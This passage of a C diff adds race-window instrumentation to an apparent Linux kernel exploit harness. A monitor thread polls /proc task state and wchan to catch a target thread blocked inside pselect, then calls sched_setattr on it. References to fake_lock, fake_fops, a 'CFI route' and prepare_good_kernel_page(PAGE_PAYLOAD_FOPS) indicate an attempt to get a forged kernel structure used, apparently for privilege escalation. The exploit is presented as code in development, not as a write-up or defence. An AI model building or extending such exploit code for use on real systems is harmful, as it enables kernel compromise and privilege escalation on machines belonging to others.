+  snprintf(path, sizeof(path), "/proc/self/task/%d/stat", tid);
+  return open(path, O_RDONLY | O_CLOEXEC);
+}
+
+#if defined(RMG_DIAG_READINESS_STATE_TRACE)
+static void readiness_monitor_state_mark(
+    struct readiness_block_monitor *monitor, int target, int tid, char state,
+    unsigned long long polls, int gate, int pselect_active, int observer_cpu,
+    long long at_us) {
+  int slot = atomic_fetch_add_explicit(&monitor->state_trace_count, 1,
+                                       memory_order_relaxed);
+  if (slot >= READINESS_MONITOR_STATE_TRACE_CAP)
+    return;
+  struct readiness_monitor_state_event *entry =
+      &monitor->state_trace[slot];
+  entry->at_us = at_us;
+  entry->polls = polls;
+  entry->tid = tid;
+  entry->target = target;
+  entry->state = (int)(unsigned char)state;
+  entry->gate = gate;
+  entry->pselect_active = pselect_active;
+  entry->observer_cpu = observer_cpu;
+}
+
+static void readiness_monitor_state_flush(
+    const struct readiness_block_monitor *monitor, int route_attempt) {
+  int count = atomic_load_explicit(&monitor->state_trace_count,
+                                   memory_order_acquire);
+  int truncated = count > READINESS_MONITOR_STATE_TRACE_CAP;
+  if (truncated)
+    count = READINESS_MONITOR_STATE_TRACE_CAP;
+  pr_info("COWSTATE attempt=%d events=%d capacity=%d truncated=%d\n",
+          route_attempt, count, READINESS_MONITOR_STATE_TRACE_CAP, truncated);
+  for (int i = 0; i < count; i++) {
+    const struct readiness_monitor_state_event *entry =
+        &monitor->state_trace[i];
+    const char *target = entry->target ? "mprotect-helper" : "waiter";
+    pr_info("COWSTATE attempt=%d target=%s tid=%d state=%d polls=%llu "
+            "gate=%d pselect_active=%d observer_cpu=%d at_us=%lld\n",
+            route_attempt, target, entry->tid, entry->state, entry->polls,
+            entry->gate, entry->pselect_active, entry->observer_cpu,
+            entry->at_us);
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+    char detail[192];
+    snprintf(detail, sizeof(detail),
+             "target=%s,state=%d,polls=%llu,gate=%d,pselect_active=%d,"
+             "observer_cpu=%d",
+             target, entry->state, entry->polls, entry->gate,
+             entry->pselect_active, entry->observer_cpu);
+    rmg_diag_checkpoint_text("readiness-monitor-state", entry->tid,
+                             (unsigned long long)entry->at_us, detail);
+#endif
+  }
+}
+#endif
+
+#if defined(RMG_DIAG_COW_ONLY) && RMG_DIAG_COW_ONLY
+static int readiness_capture_task_wchan(pid_t tid, char *buf,
+                                        size_t buf_size) {
+  if (!buf || buf_size < 2)
+    return EINVAL;
+  buf[0] = '\0';
+  char path[64];
+  snprintf(path, sizeof(path), "/proc/self/task/%d/wchan", tid);
+  int fd = open(path, O_RDONLY | O_CLOEXEC);
+  if (fd < 0)
+    return errno;
+  ssize_t len = read(fd, buf, buf_size - 1);
+  int read_errno = len < 0 ? errno : 0;
+  close(fd);
+  if (len < 0)
+    return read_errno;
+  buf[len] = '\0';
+  for (ssize_t i = 0; i < len; i++) {
+    if (buf[i] == '\n' || buf[i] == '\r') {
+      buf[i] = '\0';
+      break;
+    }
+  }
+  return 0;
+}
+
+static void readiness_record_block_sample(
+    struct readiness_block_monitor *monitor, char task_state,
+    unsigned long long polls, int gate, int runnable_after_gate,
+    int pselect_active, int task_stat_fd) {
+  monitor->block_seen = 1;
+  monitor->block_state = (int)(unsigned char)task_state;
+  monitor->block_gate = gate;
+  monitor->block_runnable_after_gate = runnable_after_gate;
+  monitor->block_pselect_started =
+      atomic_load_explicit(&monitor->pselect_call_started,
+                           memory_order_acquire);
+  monitor->block_pselect_active_at_state = pselect_active;
+  monitor->block_polls = polls;
+  monitor->block_at_us = readiness_now_us();
+  /* Preserve the state sample before doing any optional procfs work. The
+   * wchan read can outlast the pselect window and must not classify this
+   * sample or delay the monitor's active-window check. */
+  monitor->block_pselect_active_after_state = atomic_load_explicit(
+      &monitor->pselect_active, memory_order_acquire);
+  monitor->block_pselect_active_after_wchan = -1;
+  monitor->block_wchan_errno = -1;
+  monitor->block_wchan_state_after = -1;
+  monitor->block_wchan_elapsed_us = -1;
+  monitor->block_wchan[0] = '\0';
+  long long wchan_start_us = readiness_now_us();
+  monitor->block_wchan_errno = readiness_capture_task_wchan(
+      monitor->tid, monitor->block_wchan, sizeof(monitor->block_wchan));
+  monitor->block_wchan_state_after = (int)(unsigned char)
+      readiness_task_state(task_stat_fd);
+  monitor->block_pselect_active_after_wchan = atomic_load_explicit(
+      &monitor->pselect_active, memory_order_acquire);
+  monitor->block_wchan_elapsed_us = readiness_now_us() - wchan_start_us;
+}
+
+static void readiness_log_block_wchan_snapshot(
+    struct readiness_block_monitor *monitor) {
+  if (!monitor->block_seen)
+    return;
+  pr_info("readiness monitor block snapshot tid=%d "
+          "state_before_wchan=%d state_after_wchan=%d polls=%llu "
+          "at_us=%lld gate=%d runnable_after_gate=%d runnable_poll=%llu "
+          "pselect_started=%d pselect_active_state=%d/%d "
+          "wchan_capture=live-first-D wchan_elapsed_us=%lld "
+          "pselect_active_after_wchan=%d "
+          "wchan_errno=%d wchan=%s\n",
+          monitor->tid, monitor->block_state,
+          monitor->block_wchan_state_after, monitor->block_polls,
+          monitor->block_at_us,
+          monitor->block_gate, monitor->block_runnable_after_gate,
+          monitor->runnable_after_gate_polls,
+          monitor->block_pselect_started,
+          monitor->block_pselect_active_at_state,
+          monitor->block_pselect_active_after_state,
+          monitor->block_wchan_elapsed_us,
+          monitor->block_pselect_active_after_wchan,
+          monitor->block_wchan_errno,
+          monitor->block_wchan[0] ? monitor->block_wchan : "unavailable");
+}
+
+static void readiness_record_locker_block_sample(
+    struct readiness_block_monitor *monitor, char task_state,
+    unsigned long long polls, int gate, int pselect_active) {
+  if (monitor->locker_block_seen)
+    return;
+  monitor->locker_block_seen = 1;
+  monitor->locker_block_state = (int)(unsigned char)task_state;
+  monitor->locker_block_gate = gate;
+  monitor->locker_block_pselect_active = pselect_active;
+  monitor->locker_block_polls = polls;
+  monitor->locker_block_at_us = readiness_now_us();
+  monitor->locker_block_wchan_errno = -1;
+  monitor->locker_block_wchan[0] = '\0';
+  /* Read the wait channel while this TID is still present and in D state.
+   * Keep the result in memory so logging cannot extend the observed window. */
+  monitor->locker_block_wchan_errno = readiness_capture_task_wchan(
+      atomic_load_explicit(&monitor->locker_tid, memory_order_acquire),
+      monitor->locker_block_wchan, sizeof(monitor->locker_block_wchan));
+}
+
+static void readiness_log_locker_block_wchan_snapshot(
+    struct readiness_block_monitor *monitor) {
+  if (!monitor->locker_block_seen)
+    return;
+  pr_info("readiness monitor mprotect-helper block snapshot tid=%d "
+          "state=%d polls=%llu at_us=%lld gate=%d pselect_active=%d "
+          "wchan_capture=live-first-D "
+          "wchan_errno=%d wchan=%s\n",
+          atomic_load_explicit(&monitor->locker_tid, memory_order_acquire),
+          monitor->locker_block_state, monitor->locker_block_polls,
+          monitor->locker_block_at_us, monitor->locker_block_gate,
+          monitor->locker_block_pselect_active,
+          monitor->locker_block_wchan_errno,
+          monitor->locker_block_wchan[0] ? monitor->locker_block_wchan
+                                         : "unavailable");
+}
+
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+static void readiness_checkpoint_locker_block_sample(
+    const struct readiness_block_monitor *monitor) {
+  char detail[256];
+  snprintf(detail, sizeof(detail),
+           "state=%d,at_us=%lld,gate=%d,pselect_active=%d,"
+           "wchan_capture=live-first-D,wchan_errno=%d,wchan=%s",
+           monitor->locker_block_state, monitor->locker_block_at_us,
+           monitor->locker_block_gate, monitor->locker_block_pselect_active,
+           monitor->locker_block_wchan_errno,
+           monitor->locker_block_wchan[0] ? monitor->locker_block_wchan
+                                          : "unavailable");
+  if (monitor->locker_block_seen)
+    rmg_diag_checkpoint_text("readiness-monitor-locker-block",
+                             atomic_load_explicit(&monitor->locker_tid,
+                                                  memory_order_acquire),
+                             monitor->locker_block_polls, detail);
+  snprintf(detail, sizeof(detail),
+           "open_errno=%d,polls=%llu,blocked_samples=%llu,first_state=%d,last_state=%d",
+           monitor->locker_open_errno, monitor->locker_polls,
+           monitor->locker_blocked_samples, monitor->locker_first_state,
+           monitor->locker_last_state);
+  rmg_diag_checkpoint_text("readiness-monitor-locker-summary",
+                           atomic_load_explicit(&monitor->locker_tid,
+                                                memory_order_acquire),
+                           monitor->locker_polls, detail);
+}
+#endif
+
+static void readiness_log_locker_monitor_summary(
+    const struct readiness_block_monitor *monitor) {
+  pr_info("readiness mprotect-helper monitor tid=%d open_errno=%d "
+          "polls=%llu blocked_samples=%llu first_state=%d last_state=%d "
+          "block_seen=%d block_state=%d block_at_us=%lld "
+          "wchan_errno=%d wchan=%s\n",
+          atomic_load_explicit(&monitor->locker_tid, memory_order_acquire),
+          monitor->locker_open_errno, monitor->locker_polls,
+          monitor->locker_blocked_samples, monitor->locker_first_state,
+          monitor->locker_last_state, monitor->locker_block_seen,
+          monitor->locker_block_state, monitor->locker_block_at_us,
+          monitor->locker_block_wchan_errno,
+          monitor->locker_block_wchan[0] ? monitor->locker_block_wchan
+                                         : "unavailable");
+}
+
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+static void readiness_checkpoint_block_sample(
+    const struct readiness_block_monitor *monitor) {
+  if (!monitor->block_seen)
+    return;
+  const char *stage = !monitor->block_gate
+                          ? "readiness-monitor-pre-gate-block"
+                          : ((!monitor->block_pselect_active_at_state ||
+                              !monitor->block_pselect_active_after_state)
+                                 ? "readiness-monitor-block-state-outside-pselect"
+                                 : (!monitor->block_runnable_after_gate
+                                        ? "readiness-monitor-block-state-before-runnable"
+                                        : "readiness-monitor-block-state-during-pselect"));
+  char detail[384];
+  snprintf(detail, sizeof(detail),
+           "state_before_wchan=%d,state_after_wchan=%d,gate=%d,"
+           "runnable_after_gate=%d,runnable_poll=%llu,"
+           "pselect_started=%d,pselect_active_at_state=%d,"
+           "pselect_active_after_state=%d,wchan_capture=live-first-D,"
+           "wchan_elapsed_us=%lld,pselect_active_after_wchan=%d,"
+           "wchan_errno=%d,wchan=%s,"
+           "first_state=%d",
+           monitor->block_state, monitor->block_wchan_state_after,
+           monitor->block_gate,
+           monitor->block_runnable_after_gate,
+           monitor->runnable_after_gate_polls,
+           monitor->block_pselect_started,
+           monitor->block_pselect_active_at_state,
+           monitor->block_pselect_active_after_state,
+           monitor->block_wchan_elapsed_us,
+           monitor->block_pselect_active_after_wchan,
+           monitor->block_wchan_errno,
+           monitor->block_wchan[0] ? monitor->block_wchan : "unavailable",
+           monitor->first_state);
+  rmg_diag_checkpoint_text(stage, monitor->tid, monitor->block_polls,
+                           detail);
+}
+#endif
+#else
+static void readiness_log_task_wchan(pid_t tid) {
+  char path[64];
+  char buf[128];
+  snprintf(path, sizeof(path), "/proc/self/task/%d/wchan", tid);
+  int fd = open(path, O_RDONLY | O_CLOEXEC);
+  if (fd < 0) {
+    pr_info("readiness monitor wchan tid=%d monitor_tid=%ld open_errno=%d\n",
+            tid, syscall(SYS_gettid), errno);
+    return;
+  }
+  ssize_t len = read(fd, buf, sizeof(buf) - 1);
+  int read_errno = errno;
+  close(fd);
+  if (len < 0) {
+    pr_info("readiness monitor wchan tid=%d monitor_tid=%ld read_errno=%d\n",
+            tid, syscall(SYS_gettid), read_errno);
+    return;
+  }
+  buf[len] = '\0';
+  for (ssize_t i = 0; i < len; i++) {
+    if (buf[i] == '\n' || buf[i] == '\r') {
+      buf[i] = '\0';
+      break;
+    }
+  }
+  pr_info("readiness monitor wchan tid=%d monitor_tid=%ld value=%s\n",
+          tid, syscall(SYS_gettid), buf);
+}
+#endif
+
 static void *readiness_block_monitor_thread(void *arg) {
   struct readiness_block_monitor *monitor = arg;
   disable_rseq_for_thread();
 
-  char path[64];
-  snprintf(path, sizeof(path), "/proc/self/task/%d/stat", monitor->tid);
-  int fd = open(path, O_RDONLY | O_CLOEXEC);
-  if (fd < 0) {
-    monitor->open_errno = errno;
+#if defined(RMG_DIAG_PASSIVE_COW_OBSERVER) && RMG_DIAG_PASSIVE_COW_OBSERVER
+  int waiter_core = atomic_load_explicit(&route_waiter_core,
+                                         memory_order_acquire);
+  if (readiness_pin_passive_observer(
+          waiter_core, &monitor->observer_core, &monitor->helper_core,
+          &monitor->observer_inherited_affinity,
+          &monitor->observer_allowed_affinity,
+          &monitor->observer_effective_affinity) != 0) {
+    monitor->observer_affinity_errno = errno ? errno : EINVAL;
+    pr_error("readiness passive monitor affinity failed waiter_core=%d "
+             "errno=%d\n",
+             waiter_core, monitor->observer_affinity_errno);
     atomic_store_explicit(&monitor->ready, 1, memory_order_release);
     return NULL;
   }
+  pr_info("readiness passive monitor affinity inherited=%016llx "
+          "allowed=%016llx helper_core=%d effective=%016llx "
+          "observer_core=%d sched_cpu=%d waiter_core=%d\n",
+          monitor->observer_inherited_affinity,
+          monitor->observer_allowed_affinity, monitor->helper_core,
+          monitor->observer_effective_affinity, monitor->observer_core,
+          sched_getcpu(), waiter_core);
+#endif
+
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+  rmg_diag_checkpoint("readiness-monitor-thread-start", monitor->tid,
+                      monitor->seq);
+#endif
+  int fd = readiness_open_task_stat(monitor->tid);
+  if (fd < 0) {
+    monitor->open_errno = errno;
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+    rmg_diag_checkpoint("readiness-monitor-open-failed", monitor->tid,
+                        monitor->open_errno);
+#endif
+    atomic_store_explicit(&monitor->ready, 1, memory_order_release);
+    return NULL;
+  }
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+  rmg_diag_checkpoint("readiness-monitor-open", monitor->tid, fd);
+#endif
   atomic_store_explicit(&monitor->ready, 1, memory_order_release);
 
+#if defined(RMG_DIAG_PI_HELPER_STATE_TRACE_ACTIVE)
+  while (!atomic_load_explicit(&monitor->helper_stat_ready,
+                               memory_order_acquire) &&
+         !atomic_load_explicit(&monitor->stop, memory_order_acquire))
+    __asm__ volatile("yield" ::: "memory");
+  if (atomic_load_explicit(&monitor->stop, memory_order_acquire)) {
+    close(fd);
+    return NULL;
+  }
+  int helper_fd = monitor->helper_stat_fd;
+#endif
+
+#if defined(RMG_DIAG_COW_ONLY) && RMG_DIAG_COW_ONLY
+  while (!atomic_load_explicit(&monitor->locker_stat_ready,
+                               memory_order_acquire) &&
+         !atomic_load_explicit(&monitor->stop, memory_order_acquire))
+    __asm__ volatile("yield" ::: "memory");
+  if (atomic_load_explicit(&monitor->stop, memory_order_acquire)) {
+    close(fd);
+    return NULL;
+  }
+  int locker_fd = monitor->locker_stat_fd;
+#endif
+
+  unsigned long long polls = 0;
+  unsigned long long blocked_samples = 0;
+  int first_state = 0;
+  int last_state = 0;
+  int armed_logged = 0;
   while (!atomic_load_explicit(&monitor->stop, memory_order_acquire)) {
     if (!atomic_load_explicit(&monitor->armed, memory_order_acquire)) {
       __asm__ volatile("yield" ::: "memory");
       continue;
     }
-    if (readiness_task_state(fd) == 'D') {
+    if (!armed_logged) {
+      armed_logged = 1;
+#if defined(RMG_DIAG_COW_TRACE) && RMG_DIAG_COW_TRACE
+      readiness_trace_mark(READINESS_TRACE_MONITOR_ARMED, 0);
+#endif
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+      rmg_diag_checkpoint("readiness-monitor-armed", monitor->tid,
+                          monitor->seq);
+#endif
+    }
+#if defined(RMG_DIAG_PASSIVE_COW_OBSERVER) && RMG_DIAG_PASSIVE_COW_OBSERVER
+    int passive_sample_due = ((polls + 1) % 4) == 0;
+    int passive_gate_before = 0;
+    int passive_active_before = 0;
+    if (passive_sample_due) {
+      passive_gate_before = atomic_load_explicit(&monitor->trigger_gate,
+                                                 memory_order_acquire);
+      passive_active_before = atomic_load_explicit(&monitor->pselect_active,
+                                                   memory_order_acquire);
+    }
+#endif
+    char task_state = readiness_task_state(fd);
+    if (atomic_load_explicit(&monitor->stop, memory_order_acquire))
+      break;
+#if defined(RMG_DIAG_PASSIVE_COW_OBSERVER) && RMG_DIAG_PASSIVE_COW_OBSERVER
+    long long passive_sample_at_us = passive_sample_due
+        ? readiness_now_us() : 0;
+    int passive_gate_after = passive_sample_due
+        ? atomic_load_explicit(&monitor->trigger_gate, memory_order_acquire)
+        : 0;
+    int passive_active_after = passive_sample_due
+        ? atomic_load_explicit(&monitor->pselect_active, memory_order_acquire)
+        : 0;
+#endif
+#if defined(RMG_DIAG_READINESS_STATE_TRACE)
+    int previous_state = last_state;
+#endif
+    polls++;
+    last_state = (int)(unsigned char)task_state;
+    if (polls == 1)
+      first_state = last_state;
+#if defined(RMG_DIAG_READINESS_STATE_TRACE)
+    if (polls == 1 || last_state != previous_state) {
+      int gate = atomic_load_explicit(&monitor->trigger_gate,
+                                      memory_order_acquire);
+      int pselect_active = atomic_load_explicit(&monitor->pselect_active,
+                                                memory_order_acquire);
+      readiness_monitor_state_mark(monitor, 0, monitor->tid, task_state,
+                                   polls, gate, pselect_active, sched_getcpu(),
+                                   readiness_now_us());
+    }
+#endif
+#if defined(RMG_DIAG_PI_HELPER_STATE_TRACE_ACTIVE)
+    char helper_state = readiness_task_state(helper_fd);
+    if (atomic_load_explicit(&monitor->stop, memory_order_acquire))
+      break;
+    unsigned long long helper_polls = ++monitor->helper_polls;
+    int previous_helper_state = monitor->helper_last_state;
+    monitor->helper_last_state =
+        (int)(unsigned char)helper_state;
+    if (helper_polls == 1)
+      monitor->helper_first_state = monitor->helper_last_state;
+    if (helper_polls == 1 ||
+        monitor->helper_last_state != previous_helper_state) {
+      int gate = atomic_load_explicit(&monitor->trigger_gate,
+                                      memory_order_acquire);
+      int pselect_active = atomic_load_explicit(&monitor->pselect_active,
+                                                memory_order_acquire);
+      readiness_monitor_state_mark(
+          monitor, 1, monitor->helper_tid, helper_state, helper_polls, gate,
+          pselect_active, sched_getcpu(), readiness_now_us());
+    }
+    if (helper_state == 'D')
+      monitor->helper_blocked_samples++;
+#endif
+#if defined(RMG_DIAG_PASSIVE_COW_OBSERVER) && RMG_DIAG_PASSIVE_COW_OBSERVER
+    if (passive_sample_due && passive_gate_before && passive_active_before &&
+        passive_gate_after && passive_active_after) {
+      int sampled_state = (int)(unsigned char)task_state;
+      int previous_pselect_state = monitor->pselect_last_state;
+      unsigned long long pselect_sample = ++monitor->pselect_state_samples;
+      int observer_cpu = sched_getcpu();
+      if (pselect_sample == 1) {
+        monitor->pselect_first_state = sampled_state;
+        monitor->pselect_first_sample_us = passive_sample_at_us;
+        monitor->pselect_first_observer_cpu = observer_cpu;
+      }
+      monitor->pselect_last_state = sampled_state;
+      monitor->pselect_last_sample_us = passive_sample_at_us;
+      monitor->pselect_last_observer_cpu = observer_cpu;
+      if (pselect_sample == 1 || sampled_state != previous_pselect_state) {
+        readiness_monitor_state_mark(
+            monitor, 0, monitor->tid, task_state, polls, passive_gate_after,
+            passive_active_after, observer_cpu, passive_sample_at_us);
+      }
+    }
+#endif
+#if defined(RMG_DIAG_COW_ONLY) && RMG_DIAG_COW_ONLY
+    char locker_state = readiness_task_state(locker_fd);
+    if (atomic_load_explicit(&monitor->stop, memory_order_acquire))
+      break;
+    unsigned long long locker_polls = ++monitor->locker_polls;
+    int previous_locker_state = monitor->locker_last_state;
+    monitor->locker_last_state = (int)(unsigned char)locker_state;
+    if (locker_polls == 1)
+      monitor->locker_first_state = monitor->locker_last_state;
+    if (locker_polls == 1 ||
+        monitor->locker_last_state != previous_locker_state) {
+      int gate = atomic_load_explicit(&monitor->trigger_gate,
+                                      memory_order_acquire);
+      int pselect_active = atomic_load_explicit(&monitor->pselect_active,
+                                                memory_order_acquire);
+      readiness_monitor_state_mark(
+          monitor, 1,
+          atomic_load_explicit(&monitor->locker_tid, memory_order_acquire),
+          locker_state, locker_polls, gate, pselect_active, sched_getcpu(),
+          readiness_now_us());
+    }
+    if (locker_state == 'D') {
+      int gate = atomic_load_explicit(&monitor->trigger_gate,
+                                      memory_order_acquire);
+      int pselect_active = atomic_load_explicit(&monitor->pselect_active,
+                                                memory_order_acquire);
+      monitor->locker_blocked_samples++;
+      readiness_record_locker_block_sample(monitor, locker_state,
+                                           locker_polls, gate,
+                                           pselect_active);
+    }
+#endif
+    if (atomic_load_explicit(&monitor->trigger_gate,
+                             memory_order_acquire) && task_state == 'R' &&
+        !atomic_exchange_explicit(&monitor->runnable_after_gate, 1,
+                                  memory_order_acq_rel)) {
+#if defined(RMG_DIAG_COW_ONLY) && RMG_DIAG_COW_ONLY
+      monitor->runnable_after_gate_polls = polls;
+#endif
+#if defined(RMG_DIAG_COW_TRACE) && RMG_DIAG_COW_TRACE
+      readiness_trace_mark(READINESS_TRACE_POST_GATE_RUNNABLE,
+                           (int)polls);
+#endif
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+      rmg_diag_checkpoint("readiness-monitor-post-gate-runnable",
+                          monitor->tid, polls);
+#endif
+    }
+#if defined(RMG_DIAG_COW_TRACE) && RMG_DIAG_COW_TRACE
+    if (polls == 1) {
+      readiness_trace_mark(READINESS_TRACE_MONITOR_FIRST_STATE,
+                           (int)(unsigned char)task_state);
+      monitor->first_state = first_state;
+      atomic_store_explicit(&monitor->sample_ready, 1,
+                            memory_order_release);
+    }
+#endif
+    if (task_state == 'D') {
+      int trigger_gate = atomic_load_explicit(&monitor->trigger_gate,
+                                              memory_order_acquire);
+      int runnable_after_gate = atomic_load_explicit(
+          &monitor->runnable_after_gate, memory_order_acquire);
+      int pselect_active = atomic_load_explicit(&monitor->pselect_active,
+                                                memory_order_acquire);
+#if defined(RMG_DIAG_COW_ONLY) && RMG_DIAG_COW_ONLY
+      if (!monitor->block_seen)
+        readiness_record_block_sample(monitor, task_state, polls,
+                                      trigger_gate, runnable_after_gate,
+                                      pselect_active, fd);
+#endif
+      if (!trigger_gate) {
+        atomic_store_explicit(&monitor->pre_gate_block, 1,
+                              memory_order_release);
+#if !defined(RMG_DIAG_COW_ONLY) || !RMG_DIAG_COW_ONLY
+        readiness_log_task_wchan(monitor->tid);
+#endif
+        pr_info("readiness monitor pre-gate block tid=%d polls=%llu "
+                "gate=%d runnable_after_gate=%d\n",
+                monitor->tid, polls, trigger_gate, runnable_after_gate);
+#if defined(RMG_DIAG_COW_TRACE) && RMG_DIAG_COW_TRACE
+        readiness_trace_mark(READINESS_TRACE_MONITOR_BLOCKED,
+                             (int)polls);
+#endif
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+        rmg_diag_checkpoint("readiness-monitor-pre-gate-block",
+                            monitor->tid, polls);
+#endif
+        break;
+      }
+      if (!runnable_after_gate) {
+        if (!pselect_active ||
+            !atomic_load_explicit(&monitor->pselect_active,
+                                  memory_order_acquire)) {
+          monitor->post_pselect_block = 1;
+          monitor->post_pselect_block_polls = polls;
+#if defined(RMG_DIAG_COW_TRACE) && RMG_DIAG_COW_TRACE
+          readiness_trace_mark(READINESS_TRACE_MONITOR_POST_PSELECT,
+                               (int)polls);
+#endif
+        }
+        atomic_store_explicit(&monitor->pre_gate_block, 1,
+                              memory_order_release);
+#if defined(RMG_DIAG_COW_TRACE) && RMG_DIAG_COW_TRACE
+        readiness_trace_mark(READINESS_TRACE_MONITOR_BLOCKED, (int)polls);
+#endif
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+        rmg_diag_checkpoint("readiness-monitor-block-before-runnable",
+                            monitor->tid, polls);
+#endif
+        break;
+      }
+      /* A D-state sample counts as the intended waitpoint only while the
+       * target is still inside pselect. Recheck after sampling so later
+       * diagnostic proc reads cannot be mistaken for the COW fault. */
+      int pselect_active_after_sample = atomic_load_explicit(
+          &monitor->pselect_active, memory_order_acquire);
+      if (!pselect_active || !pselect_active_after_sample) {
+        monitor->post_pselect_block = 1;
+        monitor->post_pselect_block_polls = polls;
+#if defined(RMG_DIAG_COW_TRACE) && RMG_DIAG_COW_TRACE
+        readiness_trace_mark(READINESS_TRACE_MONITOR_POST_PSELECT,
+                             (int)polls);
+#endif
+        break;
+      }
+      blocked_samples++;
       atomic_store_explicit(&monitor->saw_block, 1, memory_order_release);
+#if defined(RMG_DIAG_COW_TRACE) && RMG_DIAG_COW_TRACE
+      readiness_trace_mark(READINESS_TRACE_MONITOR_BLOCKED, (int)polls);
+#endif
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+      rmg_diag_checkpoint("readiness-monitor-blocked", monitor->tid, polls);
+#endif
+#if defined(RMG_DIAG_COW_ONLY) && RMG_DIAG_COW_ONLY
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+      rmg_diag_checkpoint("readiness-monitor-sched-skipped", monitor->tid,
+                          polls);
+#endif
+      continue;
+#else
+      if (!atomic_load_explicit(&monitor->pselect_active,
+                                memory_order_acquire)) {
+        monitor->post_pselect_block = 1;
+        monitor->post_pselect_block_polls = polls;
+        monitor->sched_ret = -1;
+        monitor->sched_errno = ECANCELED;
+#if defined(RMG_DIAG_COW_TRACE) && RMG_DIAG_COW_TRACE
+        readiness_trace_mark(READINESS_TRACE_MONITOR_POST_PSELECT,
+                             (int)polls);
+#endif
+        break;
+      }
       atomic_fetch_add(&consumer_calls, 1);
+#if (defined(RMG_DIAG_PI_PROBE_ONLY) && RMG_DIAG_PI_PROBE_ONLY) || \
+    (defined(RMG_DIAG_CFI_ONLY) && RMG_DIAG_CFI_ONLY)
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+      rmg_diag_checkpoint("readiness-monitor-sched-enter", monitor->tid,
+                          polls);
+#endif
+      long long start_us = readiness_now_us();
+      errno = 0;
+#if defined(RMG_DIAG_UCLAMP_TRIGGER_ONLY) && RMG_DIAG_UCLAMP_TRIGGER_ONLY
+      monitor->sched_ret =
+          sched_setattr_tid_uclamp_nochange(monitor->tid);
+#else
+      monitor->sched_ret = sched_setattr_tid_nochange(monitor->tid);
+#endif
+#else
       int nice = monitor->seq * 7;
       if (nice > 19)
         nice = 19;
       long long start_us = readiness_now_us();
       errno = 0;
       monitor->sched_ret = sched_setattr_tid(monitor->tid, nice);
+#endif
       monitor->sched_errno = errno;
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+      rmg_diag_checkpoint("readiness-monitor-sched",
+                          (unsigned long long)monitor->sched_ret,
+                          monitor->sched_errno);
+#endif
       long long walk_us = readiness_now_us() - start_us;
       if (walk_us < 0)
         walk_us = 0;
       if (walk_us > 1000000)
         walk_us = 1000000;
       atomic_store(&consumer_walk_us, (int)walk_us);
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+      rmg_diag_checkpoint("readiness-monitor-sched-time",
+                          (unsigned long long)walk_us, monitor->tid);
+#endif
       if (monitor->sched_ret == 0)
         atomic_fetch_add(&consumer_success, 1);
       break;
+#endif
     }
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+    if (polls % 10000 == 0)
+      rmg_diag_checkpoint("readiness-monitor-progress", polls,
+                          (unsigned long long)(unsigned char)task_state);
+#endif
   }
 
+  monitor->polls = polls;
+  monitor->blocked_samples = blocked_samples;
+  monitor->first_state = first_state;
+  monitor->last_state = last_state;
   close(fd);
+#if defined(RMG_DIAG_PI_HELPER_STATE_TRACE_ACTIVE)
+  pr_info("readiness mprotect-helper observer tid=%d open_errno=%d "
+          "polls=%llu blocked_samples=%llu first_state=%d last_state=%d\n",
+          monitor->helper_tid, monitor->helper_open_errno,
+          monitor->helper_polls, monitor->helper_blocked_samples,
+          monitor->helper_first_state, monitor->helper_last_state);
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+  char helper_detail[128];
+  snprintf(helper_detail, sizeof(helper_detail),
+           "open_errno=%d,polls=%llu,blocked_samples=%llu,first_state=%d,last_state=%d",
+           monitor->helper_open_errno, monitor->helper_polls,
+           monitor->helper_blocked_samples, monitor->helper_first_state,
+           monitor->helper_last_state);
+  rmg_diag_checkpoint_text("readiness-monitor-helper-summary",
+                           monitor->helper_tid, monitor->helper_polls,
+                           helper_detail);
+#endif
+  close(helper_fd);
+#endif
+#if defined(RMG_DIAG_COW_ONLY) && RMG_DIAG_COW_ONLY
+  close(locker_fd);
+#endif
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+  rmg_diag_checkpoint("readiness-monitor-exit",
+                      atomic_load(&monitor->saw_block), polls);
+#endif
   return NULL;
 }
 
 void do_readiness_pause_route(void) {
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+  rmg_diag_checkpoint("readiness-route-start",
+                      PSELECT_CFI_ROUTE_ATTEMPTS, page_base);
+#endif
   if (!page_base || !fake_lock || !fake_fops) {
     cfi_last_step = 30;
     cfi_last_errno = 0;
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+    rmg_diag_checkpoint("readiness-route-invalid", page_base, fake_lock);
+#endif
     pr_error("readiness-pause route missing page=%016zx lock=%016zx fops=%016zx\n",
              page_base, fake_lock, fake_fops);
     return;
@@ -993,11 +2340,21 @@ void do_readiness_pause_route(void) {
   int route_verified = 0;
   for (int route_attempt = 1; route_attempt <= PSELECT_CFI_ROUTE_ATTEMPTS;
        route_attempt++) {
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+    rmg_diag_checkpoint("readiness-attempt-start", route_attempt, page_base);
+#endif
     if (route_attempt != 1) {
       page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
